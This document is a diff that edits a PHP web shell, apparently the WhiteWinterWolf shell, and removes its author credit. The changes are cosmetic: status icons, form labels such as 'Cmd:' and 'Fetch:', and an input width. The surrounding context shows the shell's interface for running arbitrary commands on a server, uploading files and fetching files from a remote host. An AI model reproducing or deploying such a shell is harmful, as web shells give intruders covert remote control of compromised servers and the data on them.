@@ -143,9 +143,9 @@ $fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];
 $pass = empty($_POST['pass']) ? '' : $_POST['pass'];
 $url = $_SERVER['REQUEST_URI'];
 $status = '';
-$ok = '☺ :';
-$warn = '⚠ :';
-$err = '☹ :';
+$ok = '&#9786; :';
+$warn = '&#9888; :';
+$err = '&#9785; :';
 
 if (! empty($passhash))
 {
@@ -232,6 +232,7 @@ if (ini_get('file_uploads') && ! empty($_FILES['upload']))
 	<table border="0">
 		<?php if (! empty($fetch_func)): ?>
 			<tr><td>
+				<b>Fetch:</b>
 			</td><td>
 				host: <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php e($fetch_host); ?>">
 				port: <input type="text" size="4" id="fetch_port" name="fetch_port" value="<?php e($fetch_port); ?>">
@@ -239,19 +240,21 @@ if (ini_get('file_uploads') && ! empty($_FILES['upload']))
 			</td></tr>
 		<?php endif; ?>
 		<tr><td>
+			<b>CWD:</b>
 		</td><td>
 			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
 			<?php if (ini_get('file_uploads')): ?>
-				<b>Send in:</b> <input type="file" id="upload" name="upload">
+				<b>Upload:</b> <input type="file" id="upload" name="upload">
 			<?php endif; ?>
 		</td></tr>
 		<tr><td>
+			<b>Cmd:</b>
 		</td><td>
-			<input type="text" size="87" id="cmd" name="cmd" value="<?php e($cmd); ?>">
+			<input type="text" size="80" id="cmd" name="cmd" value="<?php e($cmd); ?>">
 		</td></tr>
 		<tr><td>
 		</td><td>
-			<sup><a href="#" onclick="cmd.value=''; cmd.focus(); return false;">Clear Data</a></sup>
+			<sup><a href="#" onclick="cmd.value=''; cmd.focus(); return false;">Clear cmd</a></sup>
 		</td></tr>
 		<tr><td colspan="2" style="text-align: center;">
 			<input type="submit" value="Execute" style="text-align: right;">
@@ -260,11 +263,6 @@ if (ini_get('file_uploads') && ! empty($_FILES['upload']))
 	
 </form>
 <hr />
-
-</style>
-<div align="left">
-  <p><span class="style2">Coded by WhiteWinterWolf - Copyright 2022 Edited The Guler</p>
-
 
 <?php
 if (! empty($status))
